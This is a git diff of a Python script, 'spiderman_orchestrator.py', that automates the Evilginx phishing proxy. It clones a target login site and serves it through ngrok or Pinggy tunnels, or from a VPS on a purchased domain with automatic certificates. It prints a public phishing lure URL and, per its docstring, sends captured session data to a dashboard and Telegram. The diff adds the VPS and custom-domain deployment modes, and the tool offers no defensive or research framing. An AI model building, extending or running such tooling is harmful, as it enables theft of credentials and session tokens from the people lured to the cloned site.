@@ -10,8 +10,10 @@ Features:
 4.  **Live Intel**: Pipes session data directly to DissectX dashboard.
 
 Usage:
-    python3 spiderman_orchestrator.py --telegram-token <TOKEN> --chat-id <ID>
+    python3 spiderman_orchestrator.py --telegram-token <TOKEN> --chat-id <ID> [--domain <domain>] [--vps]
 """
+
+import argparse
 
 import os
 import sys
@@ -271,7 +273,11 @@ class EvilginxDriver:
     def start(self):
         # Use a local configuration directory to avoid conflicts with global ~/.evilginx
         config_dir = self.binary_path.parent.parent / "config"
-        config_dir.mkdir(exist_ok=True)
+        # CLEANUP: Wipe config dir to avoid stale phishlets/collisions
+        if config_dir.exists():
+            import shutil
+            shutil.rmtree(config_dir, ignore_errors=True)
+        config_dir.mkdir(exist_ok=True, parents=True)
         
         cmd = [str(self.binary_path), "-p", str(self.phishlets_dir), "-c", str(config_dir)]
         self.process = subprocess.Popen(
@@ -376,12 +382,13 @@ class SpidermanOrchestrator:
         # ... logic ...
         pass # (Assume implemented as before)
 
-    def auto_phish(self, target_url):
+    def auto_phish(self, target_url, custom_domain=None, is_vps=False):
         print(BANNER, flush=True)
         print(f"[*] 🎯 TARGET ACQUIRED: {target_url}", flush=True)
-        
-        # --- PARALLEL STARTUP: Tuning ---
-        # Start Tunnel in background while cloning happens to save time
+        if custom_domain:
+            print(f"[*] 🌐 CUSTOM DOMAIN: {custom_domain}", flush=True)
+        if is_vps:
+            print("[*] ☁️ VPS MODE: ACTIVE", flush=True)
         print("[*] 🚀 Initializing Infrastructure in parallel...", flush=True)
         
         # Load Config
@@ -412,11 +419,24 @@ class SpidermanOrchestrator:
 
         pinggy_token = config.get("pinggy_token", "")
         ngrok_token = config.get("ngrok_token", "")
-        self.tunnel = TunnelManager(port=443, token=pinggy_token, ngrok_token=ngrok_token)
         
-        # Start tunnel in a daemon thread so it doesn't block cloning
-        tunnel_thread = threading.Thread(target=self.tunnel.start, daemon=True)
-        tunnel_thread.start()
+        # Determine if we need a tunnel
+        use_tunnel = not custom_domain and not is_vps
+        
+        if use_tunnel:
+            self.tunnel = TunnelManager(port=443, token=pinggy_token, ngrok_token=ngrok_token)
+            # Start tunnel in a daemon thread so it doesn't block cloning
+            tunnel_thread = threading.Thread(target=self.tunnel.start, daemon=True)
+            tunnel_thread.start()
+        else:
+            self.tunnel = None
+            print("[*] Bypassing tunnel (VPS/Custom Domain active)", flush=True)
+        
+        self._free_port(8080)
+        self._free_port(4300) # Clean up Pinggy Debugger port
+        if is_vps:
+            self._free_port(80)
+            self._free_port(443)
         
         # 2. Phishlet Generation (SYNC)
         phishlets_dir = BINARY_PATH.parent / "phishlets"
@@ -474,24 +494,46 @@ class SpidermanOrchestrator:
 
         print(f"[*] ⚙️ Configuring for {phishlet_name}...", flush=True)
         
-        # Wait for tunnel if not ready yet (it likely is by now)
-        if not self.tunnel.public_url:
-            print("[*] Waiting for Tunnel negotiation (up to 30s)...", flush=True)
-            max_retries = 30
-            while not self.tunnel.public_url and max_retries > 0:
-                time.sleep(1)
-                max_retries -= 1
+        # Wait for tunnel if not ready yet
+        if use_tunnel:
+            if not self.tunnel.public_url:
+                print("[*] Waiting for Tunnel negotiation (up to 30s)...", flush=True)
+                max_retries = 30
+                while not self.tunnel.public_url and max_retries > 0:
+                    time.sleep(1)
+                    max_retries -= 1
+            
+            if not self.tunnel.public_url:
+                print("[-] Error: Tunnel failed to establish in time. Falling back to local.", flush=True)
+        else:
+             print("[*] Skipping Tunnel wait (VPS/Domain Mode)", flush=True)
 
-        # Determine simulation domain (localhost for dev, real for prod)
+        # Determine simulation domain
         fake_domain = "metrics-login.localhost" 
-        external_ip = "127.0.0.1" # Default to local
+        external_ip = "127.0.0.1" 
+        bind_ip = "0.0.0.0"
+        http_p = "8080"
+        https_p = "8081"
+        autocert = "off"
         
-        if self.tunnel.public_url:
-            # If tunnel active, use that domain!
-            # Url: https://xyz.a.pinggy.io -> Domain: xyz.a.pinggy.io
+        if use_tunnel and self.tunnel.public_url:
             print(f"[+] 🚇 Tunneled Domain Detected: {self.tunnel.public_url}", flush=True)
             fake_domain = self.tunnel.public_url.replace("https://", "").replace("http://", "").replace("/", "")
-            external_ip = "127.0.0.1" # Bind to local, tunnel forwards here
+            external_ip = "127.0.0.1"
+        elif custom_domain:
+            fake_domain = custom_domain
+            if is_vps:
+                print("[*] Fetching Public IP...", flush=True)
+                try:
+                    external_ip = requests.get("https://api.ipify.org").text
+                    print(f"[+] VPS IP: {external_ip}", flush=True)
+                except:
+                    print("[-] Failed to detect public IP, using 127.0.0.1", flush=True)
+                http_p = "80"
+                https_p = "443"
+                autocert = "on"
+            else:
+                external_ip = "127.0.0.1"
         # -----------------------------
         
         # Update phishlet with late-bound domain
@@ -510,10 +552,11 @@ class SpidermanOrchestrator:
         cmds = [
             f"config domain {fake_domain}",
             f"config ipv4 external {external_ip}",
-            f"config ipv4 bind 0.0.0.0", # Bind to all interfaces to ensure SSH tunnel can reach it
-            "config http_port 8080",   # Bind http to 8080 (Tunnel terminates SSL)
-            "config https_port 8081",  # Move https away since tunnel handles it
-            "config autocert off",     # Disable autocert for tunneled domains
+            f"config ipv4 bind {bind_ip}", 
+            f"config http_port {http_p}",
+            f"config https_port {https_p}",
+            f"config unauth_url {target_url}", 
+            f"config autocert {autocert}",
 
             f"phishlets hostname {phishlet_name} {fake_domain}",
             f"phishlets enable {phishlet_name}",
@@ -537,11 +580,11 @@ class SpidermanOrchestrator:
         
         final_url = ""
         if self.tunnel.public_url:
-             final_url = f"{self.tunnel.public_url}/login" # Default generic path often used or root
+             final_url = f"{self.tunnel.public_url}/" # Root is the landing path
              print(f"[+] 🌍 PUBLIC PHISHING URL: {final_url}", flush=True)
              print(f"[+] LURE_URL: {final_url}", flush=True) # Explicit for frontend parsing
         else:
-             final_url = f"https://{fake_domain}/login"
+             final_url = f"http://{fake_domain}/"
              print(f"[+] Phishing Lure deployed (Local): {final_url}", flush=True)
              print(f"[+] LURE_URL: {final_url}", flush=True)
              
@@ -562,12 +605,30 @@ class SpidermanOrchestrator:
                  print("[!] WARNING: Could not detect Evilginx on 8080. Check RAW logs.", flush=True)
         except: pass
         
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            self.driver.stop()
-            if self.tunnel: self.tunnel.stop()
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Spiderman Mode - Evilginx Orchestrator")
+    parser.add_argument("-t", "--target", help="Target URL (cloning)", required=True)
+    parser.add_argument("-d", "--domain", help="Custom Domain (purchased)", default=None)
+    parser.add_argument("--vps", help="Active VPS Mode (direct IP binding)", action="store_true")
+    parser.add_argument("--telegram-token", help="Telegram Bot Token", default=None)
+    parser.add_argument("--chat-id", help="Telegram Chat ID", default=None)
+    
+    args = parser.parse_args()
+
+    orchestrator = SpidermanOrchestrator(
+        telegram_token=args.telegram_token,
+        chat_id=args.chat_id
+    )
+    
+    try:
+        orchestrator.auto_phish(
+            target_url=args.target,
+            custom_domain=args.domain,
+            is_vps=args.vps
+        )
+    except KeyboardInterrupt:
+        print("\n[*] Exiting...", flush=True)
+        sys.exit(0)
 
 
 
